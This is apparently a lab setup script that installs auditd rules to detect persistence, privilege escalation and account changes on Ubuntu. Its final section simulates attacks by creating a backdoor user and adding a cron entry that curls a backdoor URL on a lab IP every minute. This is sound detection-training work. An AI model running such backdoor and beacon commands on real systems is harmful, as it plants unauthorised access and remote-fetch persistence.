#!/usr/bin/env bash
# ==============================================================================
# threat-hunting-rules.sh
# Installs auditd and configures rules to detect persistence, privilege
# escalation, and account modification on Ubuntu 24.04.
# Run this script on the VICTIM machine as root.
# Usage: sudo ./threat-hunting-rules.sh
# ==============================================================================

set -euo pipefail

# --- Configuration -----------------------------------------------------------
AUDIT_RULES_FILE="/etc/audit/rules.d/soc-lab.rules"
AUDIT_LOG="/var/log/audit/audit.log"

# --- Helper functions --------------------------------------------------------
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "Error: This script must be run as root. Use: sudo $0"
        exit 1
    fi
}

# --- Main --------------------------------------------------------------------
check_root

log "Starting auditd installation and rule configuration..."

# Step 1: Update package lists and install auditd
log "Installing auditd..."
apt-get update -qq
apt-get install -y auditd audispd-plugins
log "auditd installed successfully."

# Step 2: Enable and start auditd
log "Enabling and starting auditd service..."
systemctl enable auditd
systemctl start auditd
log "auditd service is running."

# Step 3: Write SOC Lab auditd rules
log "Writing auditd rules to ${AUDIT_RULES_FILE}..."

cat > "${AUDIT_RULES_FILE}" <<'RULES'
# ==============================================================================
# SOC Lab auditd Rules
# Purpose: Detect persistence, privilege escalation, and account modification
# ==============================================================================

# Delete all existing rules before applying these
-D

# Set the buffer size (increase if you see events being dropped)
-b 8192

# Failure mode: 1 = print a failure message, 2 = panic (use 1 for a lab)
-f 1

# --- Persistence Detection (T1053.003) ---------------------------------------
# Monitor crontab directory for writes and attribute changes
-w /var/spool/cron -p wa -k persistence
-w /var/spool/cron/crontabs -p wa -k persistence

# Monitor system-wide cron directories
-w /etc/cron.d -p wa -k persistence
-w /etc/cron.daily -p wa -k persistence
-w /etc/cron.hourly -p wa -k persistence
-w /etc/cron.monthly -p wa -k persistence
-w /etc/cron.weekly -p wa -k persistence
-w /etc/crontab -p wa -k persistence

# Monitor rc.local for startup persistence
-w /etc/rc.local -p wa -k persistence

# Monitor systemd service unit files for new or modified services
-w /etc/systemd/system -p wa -k persistence
-w /lib/systemd/system -p wa -k persistence
-w /usr/lib/systemd/system -p wa -k persistence

# Monitor init.d scripts
-w /etc/init.d -p wa -k persistence

# --- User Account Modification (T1136) ---------------------------------------
# Monitor the passwd, shadow, and group files directly
-w /etc/passwd -p wa -k user_modification
-w /etc/shadow -p wa -k user_modification
-w /etc/group -p wa -k user_modification
-w /etc/gshadow -p wa -k user_modification
-w /etc/sudoers -p wa -k user_modification
-w /etc/sudoers.d -p wa -k user_modification

# Monitor execution of user management binaries
-w /usr/sbin/useradd -p x -k user_modification
-w /usr/sbin/usermod -p x -k user_modification
-w /usr/sbin/userdel -p x -k user_modification
-w /usr/sbin/groupadd -p x -k user_modification
-w /usr/sbin/groupmod -p x -k user_modification
-w /usr/sbin/groupdel -p x -k user_modification
-w /usr/sbin/adduser -p x -k user_modification
-w /usr/sbin/deluser -p x -k user_modification

# Monitor passwd command (password changes)
-w /usr/bin/passwd -p x -k user_modification

# --- Privilege Escalation Detection (T1548) ----------------------------------
# Monitor sudo usage
-w /usr/bin/sudo -p x -k privilege_escalation
-w /usr/bin/su -p x -k privilege_escalation

# Monitor SUID/SGID bit changes on files (64-bit)
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat \
    -F auid>=1000 -F auid!=4294967295 -k privilege_escalation

# Monitor ptrace (used by some privilege escalation exploits)
-a always,exit -F arch=b64 -S ptrace -k privilege_escalation

# --- SSH Key Modification (T1098.004) ----------------------------------------
# Monitor authorised_keys files
-w /root/.ssh -p wa -k ssh_key_modification
-w /home -p wa -k ssh_key_modification

# --- Network Configuration Changes -------------------------------------------
# Monitor hosts file (DNS poisoning / persistence)
-w /etc/hosts -p wa -k network_modification

# Monitor iptables rules
-w /etc/iptables -p wa -k network_modification

# --- Sensitive File Access ---------------------------------------------------
# Monitor access to /etc/shadow (credential dumping)
-a always,exit -F arch=b64 -S open -F path=/etc/shadow -F perm=r \
    -F auid>=1000 -F auid!=4294967295 -k credential_access

# --- Kernel Module Loading (rootkit detection) --------------------------------
-w /sbin/insmod -p x -k kernel_module
-w /sbin/rmmod -p x -k kernel_module
-w /sbin/modprobe -p x -k kernel_module
-a always,exit -F arch=b64 -S init_module -S delete_module -k kernel_module

# Make the rule set immutable - prevents an attacker from clearing rules
# Uncomment the line below once you are happy with the ruleset.
# WARNING: Requires a reboot to modify rules after enabling this.
# -e 2
RULES

log "Rules file written to ${AUDIT_RULES_FILE}."

# Step 4: Load the rules
log "Loading auditd rules..."
auditctl -R "${AUDIT_RULES_FILE}" 2>/dev/null || true
augenrules --load 2>/dev/null || true
log "Rules loaded."

# Step 5: Restart auditd to apply all rules
log "Restarting auditd..."
systemctl restart auditd
sleep 2

# Step 6: Verify the rules are active
log "Verifying active rules..."
auditctl -l | grep -E "persistence|user_modification|privilege_escalation" || true

# Step 7: Verify auditd is logging
log "Checking that ${AUDIT_LOG} exists and is being written to..."
if [[ -f "${AUDIT_LOG}" ]]; then
    LAST_ENTRY=$(tail -1 "${AUDIT_LOG}")
    log "Last audit log entry: ${LAST_ENTRY}"
else
    log "Warning: ${AUDIT_LOG} does not exist yet. It will be created when the first audited event occurs."
fi

# Step 8: Run a quick test to confirm detection works
log "Running test event (useradd dry-run) to verify detection..."
ausearch -k user_modification --start today 2>/dev/null | tail -5 || true

log "===================================================================="
log "auditd setup complete."
log ""
log "Active detection keys:"
log "  persistence          - cron, systemd, rc.local modifications"
log "  user_modification    - useradd, usermod, passwd, sudoers changes"
log "  privilege_escalation - sudo, su, chmod SUID changes"
log "  ssh_key_modification - .ssh/authorized_keys changes"
log "  network_modification - /etc/hosts, iptables changes"
log "  credential_access    - reads of /etc/shadow"
log "  kernel_module        - insmod, rmmod, modprobe calls"
log ""
log "To search for events in auditd:"
log "  sudo ausearch -k persistence"
log "  sudo ausearch -k user_modification"
log "  sudo ausearch -k privilege_escalation"
log ""
log "Splunk detection query:"
log '  index=* source="/var/log/audit/audit.log"'
log '    "user_modification" OR "persistence" OR "privilege_escalation"'
log "===================================================================="

# Step 9: Simulate attack events for testing
log ""
log "Simulating attack events for testing..."

# Create backdoor user
log "Simulating: sudo useradd -m hacker123"
useradd -m hacker123 2>/dev/null && log "User hacker123 created." || log "User hacker123 already exists."

# Add cron persistence
log "Simulating: cron backdoor entry"
(crontab -l 2>/dev/null | grep -v "backdoor"; \
 echo "* * * * * /usr/bin/curl http://192.168.1.100/backdoor") | crontab -
log "Backdoor cron entry added."

# Check privilege escalation
log "Simulating: sudo -l privilege check"
sudo -l -U hacker123 2>/dev/null | head -5 || true

log ""
log "Simulation complete. Wait 30 seconds and run this Splunk query:"
log '  index=* source="/var/log/audit/audit.log"'
log '    "user_modification" OR "persistence" OR "privilege_escalation"'
log ""
log "To clean up test artifacts:"
log "  sudo userdel -r hacker123"
log "  crontab -e   (remove the backdoor line manually)"
